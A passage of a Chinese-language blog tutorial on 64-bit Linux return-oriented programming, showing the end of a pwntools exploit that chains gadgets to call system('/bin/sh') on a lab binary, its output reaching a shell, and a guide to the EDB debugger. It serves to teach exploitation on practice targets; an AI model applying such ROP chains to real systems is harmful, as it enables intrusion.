class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span></span><br><span class="line">payload3 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload3 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload3#############\n&quot;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）。最终执行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ python exp7.py </span><br><span class="line">[+] Started program <span class="string">&#x27;./level5&#x27;</span></span><br><span class="line">got_write: 0x601000</span><br><span class="line">got_read: 0x601008</span><br><span class="line">off_system_addr: 0xa1c40</span><br><span class="line"></span><br><span class="line"><span class="comment">#############sending payload1#############</span></span><br><span class="line"></span><br><span class="line">write_addr: 0x7f79d5779370</span><br><span class="line">system_addr: 0x7f79d56d7730</span><br><span class="line"></span><br><span class="line"><span class="comment">#############sending payload2#############</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#############sending payload3#############</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">mzheng</span><br></pre></td></tr></table></figure>

<h2 id="0x05-EDB调试器"><a href="#0x05-EDB调试器" class="headerlink" title="0x05 EDB调试器"></a>0x05 EDB调试器</h2><p>我们在学习Linux ROP的过程中一定少不了调试这一环节，虽然gdb的功能很强大，但命令行界面对很多人来说并不友好。很多学习Windows调试的人用惯了ollydbg再接触gdb的话总感觉很难上手。其实在linux下也有类似于ollydbg的调试工具，那就是EDB-debugger。这里给出edb的下载地址，具体的编译请参考readme：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EDB-debugger https:&#x2F;&#x2F;github.com&#x2F;eteran&#x2F;edb-debugger</span><br></pre></td></tr></table></figure>

<p>下面我们就拿level5做例子来讲解一下如何使用EDB。首先是挂载(attach)进程和设置断点(break point)。我们知道当我们在用exp.py脚本进行攻击的时候，脚本会一直运行，我们并没有足够的时间进行挂载操作。想要进行调试的话我们需要让脚本暂停一下，随后再进行挂载。暂停的方法很简单，只需要在脚本中加一句”raw_input()”即可。比如说我们想在发送payload1之前暂停一下脚本，只需要这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ss = raw_input()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload1#############\n&quot;</span></span><br><span class="line">p.send(payload1)</span><br></pre></td></tr></table></figure>

<p>这样的话，当脚本运行起来后，就会在raw_input()这一行停下来，等待用户输入。这时候我们就可以启动EDB进行挂载了。</p>
<p><img src="https://wooyun.js.org/images_result/images/2015073102531959679.png" alt="enter image description here"> </p>
<p>使用EDB进行挂载非常简单，输入进程名点ok即可。</p>
<p><img src="https://wooyun.js.org/images_result/images/2015073102531991344.png" alt="enter image description here"> </p>
<p>挂载上以后就可以设置断点了。首先在调试窗口按”ctrl + g”就可以跳转到目标地址，我们这里将地址设置为<code>0x400610</code>，也就是第一个gadget的地址。</p>
<p><img src="https://wooyun.js.org/images_result/images/2015073102531987821.png" alt="enter image description here"> </p>
<p>接着我们在<code>0x400610</code>这个地址前双击，就可以看到一个红点，说明我们已经成功的下了断点。接着按“F9”或者点击”Run”就可以让程序继续运行了。</p>
<p>虽然程序继续运行了，但是脚本还在继续等待用户的输入，这时候只需要在命令行按一下回车，程序就会继续运行，随后会暂停在”0x400610”这个断点。</p>
<p><img src="https://wooyun.js.org/images_result/images/2015073102531949768.png" alt="enter image description here"> </p>
<p>接着我们可以按”F8”或者”F7”进行单步调试，主窗口会显示pc将要执行的指令以及执行后的结果。右边会看到各个寄存器的值。注意，在寄存器（比如说RSP）的值上点击右键，可以选择”follow in dump”，随后就在data dump窗口就能看到这个地址上对应数据是什么了。除此之外，EDB还支持动态修改内存数据，当你选中数据后，可以右键，选择”Edit Bytes”，就可以对选中的数据进行动态修改。</p>
<p>以上介绍的只是EDB的一些基本操作，在随后的章节中我们还会结合其他例子继续介绍一些EDB的高级用法。</p>
<h2 id="0x06小结"><a href="#0x06小结" class="headerlink" title="0x06小结"></a>0x06小结</h2><p>可以说ROP最大的艺术就是在于gadgets千变万化的组合了。因为篇幅原因我们准备将如何寻找以及组合gadgets的技巧留到随后的文章中去介绍。欢迎大家到时继续学习。</p>
<h2 id="0x07-参考资料"><a href="#0x07-参考资料" class="headerlink" title="0x07 参考资料"></a>0x07 参考资料</h2><ol>
<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/2288">64位Linux下的栈溢出</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.leoc.io/blog/20140414/week4-bigdata-writeup/">Week4-bigdata-丘比龙版银河系最详细Writeup!</a></li>
</ol>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="wechat,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/11/02/PCRe/PE_Header/"><img class="prev-cover" src="/../cover/PCRe/PE_Header.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PE头详细分析</div></div></a></div><div class="next-post pull-right"><a href="/2021/10/19/PWN/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/lee.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">VxerLee</div><div class="author-info__description">喜欢逆向破解，漏洞挖掘、Web渗透，梦想着成为Mr. Robot</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Vxer-Lee"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/s" target="_blank" title=""><i></i></a><a class="social-icon" href="/e" target="_blank" title=""><i class="1"></i></a><a class="social-icon" href="/a" target="_blank" title=""><i class="2"></i></a><a class="social-icon" href="/r" target="_blank" title=""><i class="3"></i></a><a class="social-icon" href="/c" target="_blank" title=""><i class="4"></i></a><a class="social-icon" href="/h" target="_blank" title=""><i class="5"></i></a><a class="social-icon" href="/" target="_blank" title=""><i class="6"></i></a><a class="social-icon" href="/(" target="_blank" title=""><i class="7"></i></a><a class="social-icon" href="/%E6%90%9C" target="_blank" title=""><i class="8"></i></a><a class="social-icon" href="/%E7%B4%A2" target="_blank" title=""><i class="9"></i></a><a class="social-icon" href="/)" target="_blank" title=""><i class="10"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">喜欢一起研究逆向或者Pwn的可以加QQ群：1145528880</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux-x64%E7%AF%87-%E8%92%B8%E7%B1%B3spark"><span class="toc-number">1.</span> <span class="toc-text">一步一步学ROP之linux_x64篇(蒸米spark)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%BA%8F"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Memory-Leak-amp-DynELF-%E5%9C%A8%E4%B8%8D%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87libc-so%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 Memory Leak &amp; DynELF - 在不获取目标libc.so的情况下进行ROP攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-linux-64%E4%B8%8Elinux-86%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 linux_64与linux_86的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7%E5%AF%BB%E6%89%BEgadgets"><span class="toc-number">1.4.</span> <span class="toc-text">0x03使用工具寻找gadgets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%80%9A%E7%94%A8gadgets"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 通用gadgets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-EDB%E8%B0%83%E8%AF%95%E5%99%A8"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 EDB调试器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%E5%B0%8F%E7%BB%93"><span class="toc-number">1.7.</span> <span class="toc-text">0x06小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.8.</span> <span class="toc-text">0x07 参考资料</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By VxerLee</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>